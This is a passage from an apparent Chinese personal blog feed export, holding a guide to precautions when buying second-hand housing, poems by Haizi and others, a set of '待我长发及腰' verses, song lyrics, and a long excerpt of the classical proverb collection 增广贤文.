<h1 id="二手房交易注意事项"><a href="#二手房交易注意事项" class="headerlink" title="二手房交易注意事项"></a>二手房交易注意事项</h1><h2 id="一、产权清晰"><a href="#一、产权清晰" class="headerlink" title="一、产权清晰"></a>一、产权清晰</h2><p>产权证上的房主与卖房者是否一致；搞清楚所卖房屋的性质；产权证上所确认的面积与实际面积是否相符；验证产权证的合法性与真实性。其次，要判断其房产有没有抵押，包括私下抵押、共有人等。以避免在过户后出现不必要的争议与纠纷。</p>
<h2 id="二、房屋质量"><a href="#二、房屋质量" class="headerlink" title="二、房屋质量"></a>二、房屋质量</h2><p>观察房屋的结构，建筑与装修材料。看房屋的内外部结构是否被改动过；是否有私建部分；是否有占用走廊或阳台等；牵涉到阳台的面积怎么算的问题。</p>
<h2 id="三、居住空间"><a href="#三、居住空间" class="headerlink" title="三、居住空间"></a>三、居住空间</h2><p>观察房屋的内部结构是否合理；是否适合居住；活动空间大小等。</p>
<h2 id="四、装修配置"><a href="#四、装修配置" class="headerlink" title="四、装修配置"></a>四、装修配置</h2><p>看原房屋装修的水平、程度如何；确认房子的供电设施、供气管道、水管等是否有老化现象；电话线、宽带的安装是否完备等。</p>
<h2 id="五、物业管理"><a href="#五、物业管理" class="headerlink" title="五、物业管理"></a>五、物业管理</h2><p>了解该区水、电、煤、暖的价格及缴费方式，是上门代收还是自己去缴；观察电梯是否可以正常使用；了解该区的停车场、小区绿化的基本情况；</p>
<h2 id="六、房屋历史"><a href="#六、房屋历史" class="headerlink" title="六、房屋历史"></a>六、房屋历史</h2><p>了解该房是哪年盖的，还用多久的土地使用期限；有哪些人住过，有什么用途，房屋与住客是否曾发生过意外事故；还有原住户在当地的信用情况；是否有欠交物业费、水电费等。</p>
<h2 id="七、房屋价值"><a href="#七、房屋价值" class="headerlink" title="七、房屋价值"></a>七、房屋价值</h2><p>通过对市场上的功放的反复比较判断房屋的价值；委托信得过的中介公司进行价值评估；银行提供按揭时会作出价值评估，这个价格可以看成房屋的最低保值价。</p>
<h2 id="八、产权交接"><a href="#八、产权交接" class="headerlink" title="八、产权交接"></a>八、产权交接</h2><p>需要找个双方都信得过的单位，如信誉较好的担保公司，等过户完成后再将房款转入卖方账户。</p>
<p>除过以上问题，在二手房交易流程结束后，还有以下几个容易被忽略的小问题需要注意：</p>
<p>1、看清交房清单</p>
<p>2、检查单位室内各项设施是否有质量问题</p>
<p>3、收楼证明是否齐全</p>
<p>4、户籍是否迁出</p>
<p>5、发票是否齐全。</p>
<p>6、结清水表账单，告知电表情况</p>
<p>7、天然气过户</p>
<p>8、结清网费和电话费</p>
<p>9、协助有线电视过户</p>
<h3 id="二手房过户注意事项"><a href="#二手房过户注意事项" class="headerlink" title="二手房过户注意事项"></a>二手房过户注意事项</h3><p>二手房过户容易产生产权、租赁、违约规定等纠纷，购房者在办理过户的时候需要谨慎办理。</p>
<p>1、若要办理委托过户办理。需要由委托人出具委托书或公证书，被委托人携带委托书或公证书、个人身份证原件及复印件才能办理过户；</p>
<p>2、如果房屋已经出租，购房者办理过户必须要求卖方提供房屋承租人出具放弃优先购买权的证明；</p>
<p>3、如果房屋有共有权人，购房者应该要求卖方出具共有权人同意出售的证明和其所持有的共有权证书，或者共有权人到场签合同、办理过户；</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://www.zhihu.com/question/43603177" target="_blank" rel="noopener">二手房过户要注意什么？</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>杂侃</category>
      </categories>
      <tags>
        <tag>杂侃</tag>
        <tag>房产</tag>
      </tags>
  </entry>
  <entry>
    <title>以梦为马-海子</title>
    <url>/2019/04/16/%E6%9D%82%E4%BE%83/%E4%BB%A5%E6%A2%A6%E4%B8%BA%E9%A9%AC-%E6%B5%B7%E5%AD%90/</url>
    <content><![CDATA[<p>作者：海 子</p>
<p>我要做远方的忠诚的儿子</p>
<p>和物质的短暂情人</p>
<p>和所有以梦为马的诗人一样</p>
<p>我不得不和烈士和小丑走在同一道路上</p>
<p>万人都要将火熄灭 我一人独将此火高高举起</p>
<p>此火为大 开花落英于神圣的祖国</p>
<a id="more"></a>
<p>和所有以梦为马的诗人一样</p>
<p>我藉此火得度一生的茫茫黑夜</p>
<p>此火为大 祖国的语言和乱石投筑的梁山城寨</p>
<p>以梦为上的敦煌——那七月也会寒冷的骨骼</p>
<p>如雪白的柴和坚硬的条条白雪 横放在众神之山</p>
<p>和所有以梦为马的诗人一样</p>
<p>我投入此火 这三者是囚禁我的灯盏 吐出光辉</p>
<p>万人都要从我刀口走过 去建筑祖国的语言</p>
<p>我甘愿一切从头开始</p>
<p>和所有以梦为马的诗人一样</p>
<p>我也愿将牢底坐穿</p>
<p>众神创造物中只有我最易朽 带着不可抗拒的 死亡的速度</p>
<p>只有粮食是我珍爱</p>
<p>我将她紧紧抱住 抱住她 在故乡生儿育女</p>
<p>和所有以梦为马的诗人一样</p>
<p>我也愿将自己埋葬在四周高高的山上 守望平静的家园</p>
<p>面对大河我无限惭愧</p>
<p>我年华虚度 空有一身疲倦</p>
<p>和所有以梦为马的诗人一样</p>
<p>岁月易逝 一滴不剩 水滴中有一匹马儿 一命归天</p>
<p>千年后如若我再生于祖国的河岸</p>
<p>千年后我再次拥有中国的稻田 和周天子的雪山</p>
<p>天马踢踏</p>
<p>和所有以梦为马的诗人一样</p>
<p>我选择永恒的事业</p>
<p>我的事业 就是要成为太阳的一生</p>
<p>他从古至今——“日”——他无比辉煌无比光明</p>
<p>和所有以梦为马的诗人一样</p>
<p>最后我被黄昏的众神抬入不朽的太阳</p>
<p>太阳是我的名字</p>
<p>太阳是我的一生</p>
<p>太阳的山顶埋葬 诗歌的尸体——千年王国和我</p>
<p>骑着五千年凤凰和名字叫”马”的龙——我必将失败</p>
<p>但诗歌本身以太阳必将胜利</p>
]]></content>
      <categories>
        <category>杂侃</category>
      </categories>
      <tags>
        <tag>杂侃</tag>
      </tags>
  </entry>
  <entry>
    <title>唐多令·芦叶满汀洲</title>
    <url>/2018/07/26/%E6%9D%82%E4%BE%83/%E5%94%90%E5%A4%9A%E4%BB%A4%C2%B7%E8%8A%A6%E5%8F%B6%E6%BB%A1%E6%B1%80%E6%B4%B2/</url>
    <content><![CDATA[<p>芦叶满汀洲，寒沙带浅流。二十年重过南楼。柳下系船犹未稳，能几日，又中秋。<br>黄鹤断矶头，故人今在否？旧江山浑是新愁。欲买桂花同载酒，终不似，少年游。</p>
]]></content>
      <categories>
        <category>杂侃</category>
      </categories>
      <tags>
        <tag>杂侃</tag>
      </tags>
  </entry>
  <entry>
    <title>“待我长发及腰”下一句，你知道吗？太美了</title>
    <url>/2019/04/29/%E6%9D%82%E4%BE%83/%E5%BE%85%E6%88%91%E9%95%BF%E5%8F%91%E5%8F%8A%E8%85%B0/</url>
    <content><![CDATA[<p>待我长发及腰”的原诗原来这么美：</p>
<p><img src="/2019/04/29/杂侃/待我长发及腰/1.jpg" alt></p>
<a id="more"></a>
<p>【原诗】</p>
<p>待我长发及腰，将军归来可好？<br>此身君子意逍遥，怎料山河萧萧。</p>
<p>天光乍破遇，暮雪白头老。<br>寒剑默听奔雷，长枪独守空壕。</p>
<p>醉卧沙场君莫笑，一夜吹彻画角。<br>江南晚来客，红绳结发梢。</p>
<p><img src="/2019/04/29/杂侃/待我长发及腰/2.jpg" alt></p>
<p>【回信】</p>
<p>待卿长发及腰，我必凯旋回朝。<br>昔日纵马任逍遥，俱是少年英豪。</p>
<p>东都霞色好，西湖烟波渺。<br>执枪血战八方，誓守山河多娇。</p>
<p>应有得胜归来日，与卿共度良宵。<br>盼携手终老，愿与子同袍。</p>
<p>待尔长发及腰，吾妻归来可好？<br>看遍天下依依草，皆无吾妻飘渺。</p>
<p>几经繁华依旧，却无留恋今宵。<br>行遍天下亦逍遥，惟愿与卿同老。</p>
<p>待我长发及腰，尔来寻吾可好？<br>观遍人间君子遥，皆无尔之逍遥。</p>
<p>几经世间仍枉，却话虚度今宵。<br>何处明了意凌霄，永愿与君偕老。</p>
<p>待我长发及腰，与君相约溪桥。<br>山间薄雾暗萦绕，清风拂过眉梢。</p>
<p>帘外翠竹清高，皓月不问今朝。<br>把酒抚琴醉良宵，莫道红尘客少。</p>
<p>待我长发及腰，金榜题名可好？<br>对镜梳妆戴玉骚，只博檀郎一笑。</p>
<p>舞姿展尽妖娆，梨花暗自轻飘。<br>洞房花烛杯相交，携手今生到老。</p>
<p>待我长发及腰，月高春寒料峭，<br>满院落花谁祭扫，亭前道路遥遥。</p>
<p>清泪洒落衣角，发丝乱如荒草，<br>夜夜留梦朱颜憔，今生情何时了？</p>
<p>待我长发及腰，隐于市野可好？<br>青山绿水映石桥，几缕炊烟袅袅。</p>
<p>闲逸绣针轻挑，庭前花锄种草，<br>午后清茶淡香飘，一纸经书细瞧。</p>
<p><img src="/2019/04/29/杂侃/待我长发及腰/3.jpg" alt></p>
<p>待你长发及腰，红梅白雪轻飘。<br>相思怎比相守妙，莫等残阳西照，再把心事相表。</p>
<p>相识已是痴扰，相恋再把心交。<br>哪管前尘风萧，余生但愿晴好。</p>
<p>待我长发及腰，一份相思来闹。<br>少年回头一笑，执手共采芍药。</p>
<p>待我长发及腰，梦里北国雪飘。<br>举伞独上孔桥，一夜江水浩渺。</p>
<p>待我长发及腰，天涯望断路遥。<br>书信已绝怎找，夕阳落处心焦。</p>
<p>待我长发及腰，他乡游子可好。<br>纵有粉黛环绕，谁知你心寂寥。</p>
<p>待我长发及腰，冷看街头妖娆。<br>人言江南春好，少你何度良宵。</p>
<p>待我长发及腰，不复当年阿娇。<br>七夕之时登高，尤愿得你一抱。</p>
<p>待卿长发及腰，潘郎娶你可好？<br>待卿青丝绾正，铺十里红妆可愿？</p>
<p>却怕长发及腰，卿卿付心他人。<br>待卿青丝绾正，泪眼看他怀卿笑。</p>
<p>待我长发及腰，年华似水俏。<br>觥筹交错醉倒，嫣然拈花一笑。</p>
<p><img src="/2019/04/29/杂侃/待我长发及腰/4.jpg" alt></p>
<p>待我长发及腰，芳心暗许今宵。<br>三千弱水饮一瓢，此夜君心烙。</p>
<p>待我长发及腰，两岸青山围绕。<br>江湖浪滔滔，与君携手笑傲。</p>
<p>待我长发及腰，十里桃花翠草。<br>君洒翩翩剑影，我执美酒佳肴。</p>
<p>待我长发及腰，月下舞剑可好？<br>星夜萤火缭绕，彼时惊鸿照。</p>
<p>待我长发及腰，为君把伤疗。<br>九死一搏两心交，寒夜飞花杳杳。</p>
<p>待我长发及腰，浪迹天涯可好？<br>不求江山多娇，惟愿纵马逍遥。</p>
<p>待我长发及腰，琴笛和鸣可好？<br>不羡仙来羡鹣鲽，日日与君老。</p>
<p>待我长发及腰，少年娶我可好？<br>烛影摇红醉春宵，乱世红尘皆抛。</p>
<p>待我长发及腰，风云瞬息飘摇。<br>世态炎凉遭暗算，与君相隔朝朝。</p>
<p>待我长发及腰，立地成佛可好？<br>汝若平安归来，我必放下屠刀。</p>
<p>待我长发及腰，怎知世事难料？<br>谬误一声绝情刀，岁月终无静好。</p>
<p>待我长发及腰，相思苦泪难熬。<br>发绳飘飘情亦老，随风入尘嚣。</p>
<p><img src="/2019/04/29/杂侃/待我长发及腰/5.jpg" alt></p>
<p>待我长发及腰，已是刀兵相照。<br>梦里与子同袍，梦外冷目横交。</p>
<p>待我长发及腰，爱我好不好？<br>千秋霸业又奈何，褪去一身骄傲。</p>
<p>待我长发及腰，血染青丝白袍。<br>江山弹指为君倒，此念心字枯槁。</p>
<p>待我长发及腰，倾尽天下可好？<br>只盼此心常伴君，陪你天荒地老。</p>
<p>待我长发及腰，霜冻三尺如刀。<br>从此长眠冰湖水，湖畔鸳鸯笑。</p>
<p>待我长发及腰，注定孤独终老。<br>覆了天下如何？你好我便好。</p>
<p>我已长发及腰，只是春还早。<br>今生无缘来世续，痴心永不消。</p>
]]></content>
      <categories>
        <category>杂侃</category>
      </categories>
      <tags>
        <tag>杂侃</tag>
      </tags>
  </entry>
  <entry>
    <title>我以为我很坚强</title>
    <url>/2017/11/02/%E6%9D%82%E4%BE%83/%E6%88%91%E4%BB%A5%E4%B8%BA%E6%88%91%E5%BE%88%E5%9D%9A%E5%BC%BA/</url>
    <content><![CDATA[<p>我以为我很坚强 </p>
<p>会独自一人坚持到天亮 </p>
<p>却发现有一颗心的碎片 </p>
<p>竟撒满了我翻滚的床 </p>
<p>我以为我很骄傲 </p>
<p>会让没有你的今夜辉煌 </p>
<p>却发现冰冷的吉他 </p>
<p>弹响的竟是我的忧伤</p>
<p>静静地靠着墙 </p>
<p>以为什么都可以不想 </p>
<p>却发现你的影子 </p>
<p>竟刻在我的心上 </p>
<p>我以为我很坚强 </p>
<p>从来不会让泪流出眼眶 </p>
<p>可看着你离去的背影 </p>
<p>心竟有说不出的惆怅 </p>
<p>静静地靠着墙 </p>
<p>以为可以什么都不想 </p>
<p>却发现刻骨的爱 </p>
<p>竟让我无法抵抗</p>
]]></content>
      <categories>
        <category>杂侃</category>
      </categories>
      <tags>
        <tag>杂侃</tag>
      </tags>
  </entry>
  <entry>
    <title>增广贤文</title>
    <url>/2018/12/15/%E6%9D%82%E4%BE%83/%E5%A2%9E%E5%B9%BF%E8%B4%A4%E6%96%87/</url>
    <content><![CDATA[<p>《增广贤文》。又名《昔时贤文》《古今贤文》，是中国明代时期编写的儿童启蒙书目。书名最早见之于明万历年间的戏曲《牡丹亭》，据此可推知此书最迟写成于万历年间。<br>《增广贤文》集结中国从古到今的各种格言、谚语。后来，经过明、清两代文人的不断增补，才改成现在这个模样，称《增广昔时贤文》，通称《增广贤文》。<br><a id="more"></a></p>
<h1 id="上集"><a href="#上集" class="headerlink" title="上集"></a>上集</h1><p>昔时贤文，诲汝谆谆。集韵增广，多见多闻。<br>观今宜鉴古，无古不成今。<br>知己知彼，将心比心。<br>酒逢知己饮，诗向会人吟。相识满天下，知心能几人？<br>相逢好似初相识，到老终无怨恨心。<br>近水知鱼性，近山识鸟音。<br>易涨易退山溪水，易反易覆小人心。<br>运去金成铁，时来铁似金。<br>读书须用意，一字值千金。<br>逢人且说三分话，未可全抛一片心。<br>有意栽花花不发，无心插柳柳成荫。<br>画虎画皮难画骨，知人知面不知心。<br>钱财如粪土，仁义值千金。<br>流水下滩非有意，白云出岫本无心。<br>当时若不登高望，谁信东流海洋深？<br>路遥知马力，日久见人心。<br>两人一般心，无钱堪买金；一人一般心，有钱难买针。<br>相见易得好，久住难为人。<br>马行无力皆因瘦，人不风流只为贫。<br>饶人不是痴汉，痴汉不会饶人。<br>是亲不是亲，非亲却是亲。<br>美不美，乡中水；亲不亲，故乡人。<br>莺花犹怕春光老，岂可教人枉度春？<br>相逢不饮空归去，洞口桃花也笑人。<br>红粉佳人休使老，风流浪子莫教贫。<br>在家不会迎宾客，出门方知少主人。<br>黄芩无假，阿魏无真。<br>客来主不顾，自是无良宾。<br>良宾主不顾，应恐是痴人。<br>贫居闹市无人问，富在深山有远亲。<br>谁人背后无人说，哪个人前不说人？<br>有钱道真语，无钱语不真。<br>不信但看筵中酒，杯杯先劝有钱人。<br>闹市挣钱，静处安身。<br>来如风雨，去似微尘。<br>长江后浪推前浪，世上新人换旧人。<br>近水楼台先得月，向阳花木早逢春。<br>古人不见今时月，今月曾经照古人。<br>先到为君，后到为臣。<br>莫道君行早，更有早行人。<br>莫信直中直，须防仁不仁。<br>山中有直树，世上无直人。<br>自恨枝无叶，莫怨太阳偏。<br>大家都是命，半点不由人。<br>一年之计在于春，一日之计在于晨。<br>一家之计在于和，一生之计在于勤。<br>责人之心责己，恕己之心恕人。<br>守口如瓶，防意如城。<br>宁可人负我，切莫我负人。<br>再三须慎意，第一莫欺心。<br>虎生犹可近，人熟不堪亲。<br>来说是非者，便是是非人。<br>远水难救近火，远亲不如近邻。<br>有茶有酒多兄弟，急难何曾见一人？<br>人情似纸张张薄，世事如棋局局新。<br>山中也有千年树，世上难逢百岁人。<br>力微休负重，言轻莫劝人。<br>无钱休入众，遭难莫寻亲。<br>平生不做皱眉事，世上应无切齿人。<br>士乃国之宝，儒为席上珍。<br>若要断酒法，醒眼看醉人。<br>求人须求英雄汉，济人须济急时无。<br>渴时一滴如甘露，醉后添杯不如无。<br>久住令人贱，频来亲也疏。<br>酒中不语真君子，财上分明大丈夫。<br>贫贱之交不可忘，糟糠之妻不下堂。<br>出家如初，成佛有余。<br>积金千两，不如明解经书。<br>养子不教如养驴，养女不教如养猪。<br>有田不耕仓廪虚，有书不读子孙愚。<br>仓廪虚兮岁月乏，子孙愚兮礼仪疏。<br>听君一席话，胜读十年书。<br>人不通今古，马牛如襟裾。<br>茫茫四海人无数，哪个男儿是丈夫？<br>白酒酿成缘好客，黄金散尽为诗书。<br>救人一命，胜造七级浮屠。<br>城门失火，殃及池鱼。<br>庭前生瑞草，好事不如无。<br>欲求生富贵，须下死工夫。<br>百年成之不足，一旦坏之有余。<br>人心似铁，官法如炉。<br>善化不足，恶化有余。<br>水至清则无鱼，人至察则无徒。<br>知者减半，愚者全无。<br>在家由父，出嫁从夫。<br>痴人畏妇，贤女敬夫。<br>是非终日有，不听自然无。<br>竹篱茅舍风光好，道院僧房终不如。<br>宁可正而不足，不可邪而有余。<br>宁可信其有，不可信其无。<br>命里有时终须有，命里无时莫强求。<br>道院迎仙客，书堂隐相儒。<br>庭栽栖凤竹，池养化龙鱼。<br>结交须胜己，似我不如无。<br>但看三五日，相见不如初。<br>人情似水分高下，世事如云任卷舒。<br>会说说都是，不会说无理。<br>磨刀恨不利，刀利伤人指。<br>求财恨不多，财多害自己。<br>知足常足，终身不辱；<br>知止常止，终身不耻。<br>有福伤财，无福伤己。<br>失之毫厘，谬以千里。<br>若登高必自卑，若涉远必自迩。<br>三思而行，再思可矣。<br>使口不如亲为，求人不如求己。<br>小时是兄弟，长大各乡里。<br>嫉财莫嫉食，怨生莫怨死。<br>人见白头嗔，我见白头喜。<br>多少少年郎，不到白头死。<br>墙有缝，壁有耳。<br>好事不出门，坏事传千里。<br>若要人不知，除非己莫为。<br>为人不做亏心事，半夜敲门心不惊。<br>贼是小人，智过君子。<br>君子固穷，小人穷斯滥矣。<br>贫穷自在，富贵多忧。<br>不以我为德，反以我为仇。<br>宁向直中取，不可曲中求。<br>人无远虑，必有近忧。<br>知我者谓我心忧，不知我者谓我何求？<br>晴天不肯去，直待雨淋头。<br>成事莫说，覆水难收。<br>是非只为多开口，烦恼皆因强出头。<br>忍得一时之气，免得百日之忧。<br>近来学得乌龟法，得缩头时且缩头。<br>惧法朝朝乐，欺心日日忧。<br>人生一世，草长一秋。<br>月过十五光明少，人到中年万事休。<br>儿孙自有儿孙福，莫为儿孙做马牛。<br>为人莫做千年计，三十河东四十西。<br>人生不满百，常怀千岁忧。<br>今朝有酒今朝醉，明日愁来明日忧。<br>路逢险处须回避，事到临头不自由。<br>人贫不语，水平不流。<br>一家养女百家求，一马不行百马忧。<br>有花方酌酒，无月不登楼。<br>三杯通大道，一醉解千愁。<br>深山毕竟藏猛虎，大海终须纳细流。<br>惜花须检点，爱月不梳头。<br>大抵选她肌骨好，不搽红粉也风流。<br>受恩深处宜先退，得意浓时便可休。<br>莫待是非来入耳，从前恩爱反为仇。<br>留得五湖明月在，不愁无处下金钩。<br>休别有鱼处，莫恋浅滩头。<br>去时终须去，再三留不住。<br>忍一句，息一怒，饶一着，退一步。<br>三十不豪，四十不富，五十将衰寻子助。<br>生不认魂，死不认尸。<br>一寸光阴一寸金，寸金难买寸光阴。<br>黑发不知勤学早，转眼便是白头翁。<br>父母恩深终有别，夫妻义重也分离。<br>人生似鸟同林宿，大难来时各自飞。<br>人善被人欺，马善被人骑。<br>人无横财不富，马无夜草不肥。<br>人恶人怕天不怕，人善人欺天不欺。<br>善恶到头终有报，只盼来早与来迟。<br>黄河尚有澄清日，岂能人无得运时？<br>得宠思辱，居安思危。<br>念念有如临敌日，心心常似过桥时。<br>英雄行险道，富贵似花枝。<br>人情莫道春光好，只怕秋来有冷时。<br>送君千里，终有一别。<br>但将冷眼观螃蟹，看你横行到几时。<br>见事莫说，问事不知。<br>闲事莫管，无事早归。<br>假缎染就真红色，也被旁人说是非。<br>善事可做，恶事莫为。<br>许人一物，千金不移。<br>龙生龙子，虎生虎儿。<br>龙游浅水遭虾戏，虎落平阳被犬欺。<br>一举首登龙虎榜，十年身到凤凰池。<br>十年寒窗无人问，一举成名天下知。<br>酒债寻常处处有，人生七十古来稀！<br>养儿防老，积谷防饥。<br>鸡豚狗彘之畜，无失其时，数口之家，可以无饥矣。<br>当家才知盐米贵，养子方知父母恩。<br>常将有日思无日，莫把无时当有时。<br>树欲静而风不止，子欲养而亲不待。<br>时来风送滕王阁，运去雷轰荐福碑。<br>入门休问荣枯事，且看容颜便得知。<br>官清司吏瘦，神灵庙祝肥。<br>息却雷霆之怒，罢却虎豹之威。<br>饶人算之本，输人算之机。<br>好言难得，恶语易施。<br>一言既出，驷马难追。<br>道吾好者是吾贼，道吾恶者是吾师。<br>路逢侠客须呈剑，不是才人莫献诗。<br>三人同行，必有我师。择其善者而从之，其不善者而改之。<br>欲昌和顺须为善，要振家声在读书。<br>少壮不努力，老大徒伤悲。<br>人有善愿，天必佑之。<br>莫饮卯时酒，昏昏醉到酉。<br>莫骂酉时妻，一夜受孤凄。<br>种麻得麻，种豆得豆。<br>天眼恢恢，疏而不漏。<br>做官莫向前，作客莫在后。<br>宁添一斗，莫添一口。<br>螳螂捕蝉，岂知黄雀在后？<br>不求金玉重重贵，但愿儿孙个个贤。<br>一日夫妻，百世姻缘。<br>百世修来同船渡，千世修来共枕眠。<br>杀人一万，自损三千。<br>伤人一语，利如刀割。<br>枯木逢春犹再发，人无两度再少年。<br>未晚先投宿，鸡鸣早看天。<br>将相顶头堪走马，公侯肚内好撑船。<br>富人思来年，穷人想眼前。<br>世上若要人情好，赊去物品莫取钱。<br>生死有命，富贵在天。<br>击石原有火，不击乃无烟。<br>人学始知道，不学亦徒然。<br>莫笑他人老，终须还到老。<br>和得邻里好，犹如拾片宝。<br>但能守本分，终身无烦恼。<br>大家做事寻常，小家做事慌张。<br>大家礼义教子弟，小家凶恶训儿郎。<br>君子爱财，取之有道。<br>贞妇爱色，纳之以礼。<br>善有善报，恶有恶报。<br>不是不报，时候未到。<br>万恶淫为首，百善孝当先。<br>人而无信，不知其可也。<br>一人道虚，千人传实。<br>凡事要好，须问三老。<br>若争小利，便失大道。<br>家中不和邻里欺，邻里不和说是非。<br>年年防饥，夜夜防盗。<br>学者是好，不学不好。<br>学者如禾如稻，不学如草如蒿。<br>遇饮酒时须防醉，得高歌处且高歌。<br>因风吹火，用力不多。<br>不因渔夫引，怎能见波涛？<br>无求到处人情好，不饮任他酒价高。<br>知事少时烦恼少，识人多处是非多。<br>世间好语书说尽，天下名山僧占多。<br>进山不怕伤人虎，只怕人情两面刀。<br>强中更有强中手，恶人须用恶人磨。<br>会使不在家富豪，风流不用衣着多。<br>光阴似箭，日月如梭。<br>天时不如地利，地利不如人和。<br>黄金未为贵，安乐值钱多。<br>为善最乐，作恶难逃。<br>羊有跪乳之恩，鸦有反哺之情。<br>孝顺还生孝顺子，忤逆还生忤逆儿。<br>不信但看檐前水，点点滴滴旧池窝。<br>隐恶扬善，执其两端。<br>妻贤夫祸少，子孝父心宽。<br>已覆之水，收之实难。<br>人生知足时常足，人老偷闲且是闲。<br>处处绿杨堪系马，家家有路通长安。<br>既坠釜甑，反顾无益。<br>见者易，学者难。莫将容易得，便作等闲看。<br>厌静还思喧，嫌喧又忆山。<br>自从心定后，无处不安然。<br>用心计较般般错，退后思量事事宽。<br>道路各别，养家一般。<br>由俭入奢易，从奢入俭难。<br>知音说与知音听，不是知音莫与谈。<br>点石化为金，人心犹未足。<br>信了赌，卖了屋。<br>他人观花，不涉你目。<br>他人碌碌，不涉你足。<br>谁人不爱子孙贤，谁人不爱千钟粟。<br>奈五行，不是这般题目。<br>莫把真心空计较，儿孙自有儿孙福。<br>书到用时方恨少，事非经过不知难。<br>天下无不是的父母，世上最难得者兄弟。<br>与人不和，劝人养鹅；与人不睦，劝人架屋。<br>但行好事，莫问前程。不交僧道，便是好人。<br>河狭水激，人急计生。<br>明知山有虎，莫向虎山行。<br>路不铲不平，事不为不成。<br>无钱方断酒，临老始读经。<br>点塔七层，不如暗处一灯。<br>堂上二老是活佛，何用灵山朝世尊。<br>万事劝人休瞒昧，举头三尺有神明。<br>但存方寸土，留与子孙耕。<br>灭却心头火，剔起佛前灯。<br>惺惺多不足，蒙蒙作公卿。<br>众星朗朗，不如孤月独明。<br>兄弟相害，不如友生。<br>合理可作，小利不争。<br>牡丹花好空入目，枣花虽小结实多。<br>欺老莫欺小，欺人心不明。<br>勤奋耕锄收地利，他时饱暖谢苍天。<br>得忍且忍，得耐且耐，不忍不耐，小事成灾。<br>相论逞英豪，家计渐渐退。<br>贤妇令夫贵，恶妇令夫败。<br>一人有庆，兆民咸赖。<br>人老心未老，人穷志莫穷。<br>人无千日好，花无百日红。<br>黄蜂一口针，橘子两边分。<br>世间痛恨事，最毒淫妇心。<br>杀人可恕，情理不容。<br>乍富不知新受用，乍贫难改旧家风。<br>座上客常满，杯中酒不空。<br>屋漏更遭连夜雨，行船又遇打头风。<br>笋因落箨方成竹，鱼为奔波始化龙。<br>记得少年骑竹马，转眼又是白头翁。<br>礼义生于富足，盗贼出于赌博。<br>天上众星皆拱北，世间无水不朝东。<br>士为知己者死，女为悦己者容。<br>色即是空，空即是色。<br>君子安贫，达人知命。<br>良药苦口利于病，忠言逆耳利于行。<br>顺天者昌，逆天者亡。<br>有缘千里来相会，无缘对面不相逢。<br>有福者昌，无福者亡。<br>人为财死，鸟为食亡。<br>夫妻相和好，琴瑟与笙簧。<br>红粉易妆娇态女，无钱难作好儿郎。<br>有子之人贫不久，无儿无女富不长。<br>善必寿老，恶必早亡。<br>爽口食多偏作病，快心事过恐遭殃。<br>富贵定要依本分，贫穷不必再思量。<br>画水无风空作浪，绣花虽好不闻香。<br>贪他一斗米，失却半年粮。<br>争他一脚豚，反失一肘羊。<br>龙归晚洞云犹湿，麝过春山草木香。<br>平生只会说人短，何不回头把己量？<br>见善如不及，见恶如探汤。<br>人穷志短，马瘦毛长。<br>自家心里急，他人未知忙。<br>贫无达士将金赠，病有高人说药方。<br>触来莫与竞，事过心清凉。<br>秋来满山多秀色，春来无处不花香。<br>凡人不可貌相，海水不可斗量。<br>清清之水为土所防，济济之士为酒所伤。<br>蒿草之下或有兰香，茅茨之屋或有侯王。<br>无限朱门生饿殍，几多白屋出公卿。<br>酒里乾坤大，壶中日月长。<br>拂石坐来春衫冷，踏花归去马蹄香。<br>万事前身定，浮生空自忙。<br>叫月子规喉舌冷，宿花蝴蝶梦魂香。<br>一言不中，千言不用。<br>一人传虚，百人传实。<br>万金良药，不如无疾。<br>千里送鹅毛，礼轻情义重。<br>世事如明镜，前程暗似漆。<br>君子怀刑，小人怀惠。<br>架上碗儿轮流转，媳妇自有做婆时。<br>人生一世，如驹过隙。<br>良田万顷，日食一升。<br>大厦千间，夜眠八尺。<br>千经万典，孝义为先。<br>天上人间，方便第一。<br>一字入公门，九牛拔不出。<br>八字衙门向南开，有理无钱莫进来。<br>欲求天下事，须用世间财。<br>富从升合起，贫因不算来。<br>近河不得枉使水，近山不得枉烧柴。<br>家无读书子，官从何处来？<br>慈不掌兵，义不掌财。<br>一夫当关，万夫莫开。<br>万事不由人计较，一生都是命安排。<br>白云本是无心物，却被清风引出来。<br>慢行急行，逆取顺取。<br>命中只有如许财，丝毫不可有闪失。<br>人间私语，天闻若雷。<br>暗室亏心，神目如电。<br>一毫之恶，劝人莫作。一毫之善，与人方便。<br>亏人是祸，饶人是福，天眼恢恢，报应甚速。<br>圣贤言语，神钦鬼服。<br>人各有心，心各有见。<br>口说不如身逢，耳闻不如目见。<br>见人富贵生欢喜，莫把心头似火烧。<br>养兵千日，用在一时。<br>国清才子贵，家富小儿娇。<br>利刀割体疮犹使，恶语伤人恨不消。<br>公道世间唯白发，贵人头上不曾饶。<br>有才堪出众，无衣懒出门。<br>为官须作相，及第必争先。<br>苗从地发，树由枝分。<br>宅里燃火，烟气成云。<br>以直报怨，知恩报恩。<br>红颜今日虽欺我，白发他时不放君。<br>借问酒家何处有，牧童遥指杏花村。<br>父子和而家不退，兄弟和而家不分。<br>一片云间不相识，三千里外却逢君。<br>官有公法，民有私约。<br>平时不烧香，临时抱佛脚。<br>幸生太平无事日，恐防年老不多时。<br>国乱思良将，家贫思良妻。<br>池塘积水须防旱，田地深耕足养家。<br>根深不怕风摇动，树正何愁月影斜。<br>争得猫儿，失却牛脚。<br>愚者千虑，必有一得，智者千虑，必有一失。<br>始吾于人也，听其言而信其行。<br>今吾于人也，听其言而观其行。<br>哪个梳头无乱发，情人眼里出西施。<br>珠沉渊而川媚，玉韫石而山辉。<br>夕阳无限好，只恐不多时。<br>久旱逢甘霖，他乡遇故知；洞房花烛夜，金榜题名时。<br>惜花春起早，爱月夜眠迟。<br>掬水月在手，弄花香满衣。<br>桃红李白蔷薇紫，问着东君总不知。<br>教子教孙须教义，栽桑栽柘少栽花。<br>休念故乡生处好，受恩深处便为家。<br>学在一人之下，用在万人之上。<br>一日为师，终生为父。<br>忘恩负义，禽兽之徒。<br>劝君莫将油炒菜，留与儿孙夜读书。<br>书中自有千钟粟，书中自有颜如玉。<br>莫怨天来莫怨人，五行八字命生成。<br>莫怨自己穷，穷要穷得干净；莫羡他人富，富要富得清高。<br>别人骑马我骑驴，仔细思量我不如，<br>待我回头看，还有挑脚汉。<br>路上有饥人，家中有剩饭。<br>积德与儿孙，要广行方便。<br>作善鬼神钦，作恶遭天遣。<br>积钱积谷不如积德，买田买地不如买书。<